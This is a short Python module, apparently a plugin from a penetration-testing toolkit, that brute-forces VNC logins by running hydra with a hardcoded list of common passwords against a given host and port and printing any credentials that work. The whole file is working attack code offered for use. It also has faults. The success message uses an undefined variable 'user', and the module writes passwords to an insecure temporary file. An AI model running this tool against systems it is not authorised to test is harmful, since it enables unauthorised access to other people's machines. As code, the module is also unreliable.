from __future__ import print_function

import nmap
import tempfile

from fart.utils import *

def commonlogins(host, port, service, output_file, **kwargs):
    COMMON_PASS =  [ 'root', 'toor', 'password', 'r00t', 'Password1', '12345678', '?????', 'test', 'test2' ]

    passwords_path = tempfile.mktemp()
    with open(passwords_path, 'w') as passwords_file:
        passwords_file.write('\n'.join(COMMON_PASS))
        passwords_file.write('\n')

    HYDRA = 'hydra -s {} -v -I -P {} -t4 vnc://{} 2>/dev/null'.format(port, passwords_path, host)
    try:
        results, __ = execute_cmd(HYDRA)
        _results = results.split('\n')

        for line in _results:
            if 'login:' in line:
                pwd = line.split(' ')[10]
                print_green('[{}] Valid VNC credentials found: {}:{}'.format(host, user, pwd))

        with open(output_file, 'w') as output:
            output.write(results)
    except Exception as e:
        print_red('Error during hydra (vnc): {}'.format(HYDRA))
        print_red('Error message: {}'.format(e))

    os.unlink(passwords_path)
